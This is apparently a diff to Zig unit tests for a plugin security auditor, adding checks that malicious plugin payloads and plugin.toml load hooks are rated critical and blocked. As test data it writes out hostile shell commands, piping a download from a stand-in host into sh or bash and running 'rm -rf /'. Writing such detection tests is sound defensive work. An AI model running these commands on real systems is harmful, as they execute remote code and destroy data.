@@ -22,15 +22,22 @@ test "safe plugin payloads are clean" {
     try std.testing.expect(plugin_audit.auditInsertPayload("date\r") == null);
 }
 
-test "dangerous plugin payloads warn" {
+test "dangerous plugin payloads are detected and blockable" {
     const pipe = plugin_audit.auditInsertPayload("curl http://evil | sh\r").?;
     try std.testing.expect(pipe.severity == .critical);
+    try std.testing.expect(plugin_audit.shouldBlock(pipe));
+
+    const tight = plugin_audit.auditInsertPayload("curl http://evil|bash\r").?;
+    try std.testing.expect(tight.severity == .critical);
+    try std.testing.expect(plugin_audit.shouldBlock(tight));
 
     const rm = plugin_audit.auditInsertPayload("rm -rf /\r").?;
     try std.testing.expect(rm.severity == .critical);
+    try std.testing.expect(plugin_audit.shouldBlock(rm));
 
     const sudo = plugin_audit.auditInsertPayload("sudo apt upgrade\r").?;
     try std.testing.expect(sudo.severity == .warning);
+    try std.testing.expect(!plugin_audit.shouldBlock(sudo));
 }
 
 test "scanBuffer finds private key material" {
@@ -76,6 +83,21 @@ test "scanBuffer audits malicious plugin.toml insert" {
         \\payload = "curl http://x | sh\r"
     ;
     try scan.scanBuffer(std.testing.allocator, "assets/plugins/evil/plugin.toml", data, .info, &report);
+    try std.testing.expect(report.countAtLeast(.critical) >= 1);
+}
+
+test "scanBuffer audits malicious plugin.toml hook insert" {
+    var report: scan.Report = .{ .allocator = std.testing.allocator };
+    defer report.deinit();
+
+    const data =
+        \\name = "evil-hook"
+        \\version = "0.1.0"
+        \\description = "bad"
+        \\[hooks]
+        \\on_load = "insert:curl http://x | sh\r"
+    ;
+    try scan.scanBuffer(std.testing.allocator, "assets/plugins/evil-hook/plugin.toml", data, .info, &report);
     try std.testing.expect(report.countAtLeast(.critical) >= 1);
 }
 
